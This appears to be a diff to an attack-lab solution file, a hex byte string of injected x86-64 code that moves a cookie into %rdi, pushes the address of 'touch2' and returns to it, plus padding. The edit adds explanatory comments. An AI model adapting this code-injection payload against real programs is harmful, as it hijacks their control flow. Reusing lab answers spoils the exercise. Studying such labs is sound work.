@@ -1,6 +1,6 @@
-48 c7 c7 fa 97 b9 59 	/* mov    $0x59b997fa,%rdi  -- 7 bytes */
-68 ec 17 40 00       	/* push   $0x4017ec -- 5 bytes */
-c3                   	/* ret -- 1 byte */
+48 c7 c7 fa 97 b9 59 	/* mov    $0x59b997fa,%rdi  -- move cookie to %rdi (7 bytes) */
+68 ec 17 40 00       	/* push   $0x4017ec -- push &touch2 to stack (5 bytes) */
+c3                   	/* ret -- switch control to function 'touch2' (1 byte) */
 
 /* 13 bytes in total, need 27 bytes as place holders */
 00 00 00 00 00 00 00 00 00
